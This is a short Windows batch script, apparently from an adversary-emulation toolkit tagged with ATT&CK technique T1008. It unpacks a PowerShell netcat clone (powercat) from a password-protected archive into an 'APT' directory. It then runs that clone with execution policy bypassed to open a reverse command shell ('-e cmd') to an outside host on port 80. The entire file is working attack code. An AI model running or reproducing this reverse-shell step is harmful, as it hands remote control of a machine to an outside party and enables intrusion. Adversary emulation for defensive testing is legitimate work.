@ECHO OFF

ECHO ===========================================================================
ECHO NETCAT ALTERNATIVE - T1008
ECHO Dropping a Powershell netcat alternative into the APT dir
ping -n 5 127.0.0.1 > NUL

"%ZIP%" e -p%PASS% "%TOOLARCH%" -aoa -o"%APTDIR%" toolset\nc.ps1 > NUL
powershell -Exec Bypass ". \"%APTDIR%\nc.ps1\";powercat -c www.safekeepsecurity.com -p 80 -t 2 -e cmd"
